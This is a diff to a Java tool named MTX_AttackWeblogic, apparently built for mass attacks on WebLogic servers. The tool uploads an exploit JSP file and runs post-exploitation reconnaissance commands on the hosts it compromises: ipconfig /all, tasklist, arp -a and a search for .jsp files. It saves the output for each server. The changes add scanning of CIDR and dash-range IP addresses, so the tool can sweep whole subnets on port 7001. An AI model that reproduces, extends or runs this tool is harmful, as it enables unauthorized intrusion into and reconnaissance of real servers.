@@ -2,10 +2,9 @@ package com.mtx.tianxia.hacker;
 
 import java.io.File;
 import java.util.ArrayList;
-import java.util.Date;
 import java.util.HashMap;
+import java.util.List;
 import java.util.Map;
-import java.util.TreeMap;
 
 import javax.naming.InitialContext;
 import javax.servlet.jsp.JspWriter;
@@ -55,10 +54,11 @@ public class MTX_AttackWeblogic extends InfoLog
 	{
 		String szFile = "data/" + szServer+"_" + port + ".txt";
 		File fOld = new File(szFile); 
+		// 存在就生成性的文件
 		if(fOld.exists())
 		{
-//			fOld.renameTo(new File("data/" + szServer+"_" + port + "_"+ System.nanoTime() + ".txt"));
-			return;
+			fOld.renameTo(new File("data/" + szServer+"_" + port + "_"+ System.nanoTime() + ".txt"));
+//			return;
 		}
 		
 		String szMyHackFile = InfoLog.getFile(new File("/Users/xiatian/project/sfTester/data/exp.jsp"));
@@ -71,12 +71,14 @@ public class MTX_AttackWeblogic extends InfoLog
 		{
 			writeFile(szFile, s + "\n");
 			 a = new String[]{
-					 "服务器时间",
-					 "date /t;uptime",
+					 "jsp文件",
+					 "cmd.exe /c find . -name *.jsp",
 					 "当前目录",
 					 "cmd.exe /c echo %cd%",
 						"网络ip配置",
 						"cmd.exe /c ipconfig  /all",
+						"进程信息",
+						"tasklist",
 						"arp信息",
 						"cmd.exe /c arp -a",
 						"主机信息1",
@@ -509,21 +511,56 @@ public class MTX_AttackWeblogic extends InfoLog
         }
 	   }
 	}
+	// 整型转换ip
+	public static String longToIp(long l)
+	{
+		return (l >> 24 & 0x000000FF) 
+				+ "." + (l  >>16  & 0x000000FF)
+				+ "." + (l >> 8  &  0x000000FF)
+				+ "." + (l & 0x000000FF);
+	}
 	/*
 	 * 单个ip处理
 	 * */
-	public static String getOneIp(String s)
+	public static String getOneIp(String s, List <String>a, boolean bWd)
 	{
-		;
+		String []y = s.split("[\\/\\-]");
+		String []x = y[0].split("\\.");
+		int n1 = Integer.parseInt(x[0]),
+			n2 = Integer.parseInt(x[1]),
+			n3 = Integer.parseInt(x[2]),
+			n4 = Integer.parseInt(x[3]);
+		long lnIp = (n1 << 24) | (n2 << 16) | (n3 << 8) | n4;
+		int nW1 = Integer.parseInt(y[1]);
+		long lE = nW1 - n4;
+		// 192.168.10.0/24，192.168.10.0/16，格式
+		if(bWd)
+		{
+			int nW = 32 - nW1;
+			long lnTmp = 0xFFFFFFFFL;
+			// 为什么变成-1了
+			lE = (((lnTmp <<  (long)nW1) & lnTmp)  >> (long)nW1) & lnTmp;
+			lnIp = (lnIp >> nW << nW)  & lnTmp;
+			System.out.println(nW1);
+			System.out.println(lE);
+		}
+		// 默认 192.168.10.0-240，192.168.10.2-6，格式
+		System.out.println(longToIp(lnIp) + " ... " + longToIp(lnIp + lE));
+		for(long i1 = lnIp, i2 = lnIp + lE; i1 <= i2; i1++)
+		{
+			a.add(longToIp(i1));
+		}
+		
 		return s;
 	}
 	
 	public static String getIps(String s)
 	{
 		int i = s.indexOf('-'), j = s.indexOf('/');
-		if(-1 == i || -1 == j)return s;
+		if(-1 == i && -1 == j)return s;
 		StringBuffer buf = new StringBuffer(); 
 		String []a = s.split(";");
+		List <String>aList = new ArrayList<String>();
 		for(int x = 0, y = a.length; x < y; x++)
 		{
 			i = a[x].indexOf('-');
@@ -534,11 +571,19 @@ public class MTX_AttackWeblogic extends InfoLog
 			}
 			else
 			{
-				a[x] = getOneIp(a[x]);
+				String []aP = a[x].split(":");
+				a[x] = getOneIp(aP[0],aList, -1 < j);
+				if(0 < aList.size())
+				{
+					for(int xi = 0, xj = aList.size(); xi < xj; xi++)
+					{
+						buf.append(aList.get(xi)).append(":").append(aP[1]).append(";");
+					}
+					aList.clear();
+				}
 			}
 		}
 		if(0 == buf.length())return s;
-		
 		return buf.toString();
 	}
 	
@@ -550,6 +595,10 @@ public class MTX_AttackWeblogic extends InfoLog
 	public static void main(String[] args)
 	{
 		System.setProperty("java.net.useSystemProxies", "true");
+		
+//		args = new String[]{"192.168.10.202/24:7001"};
+		
+		new File("./data").mkdirs();
 		final MTX_AttackWeblogic ma = new MTX_AttackWeblogic();
 		if(0 < args.length)
 		{
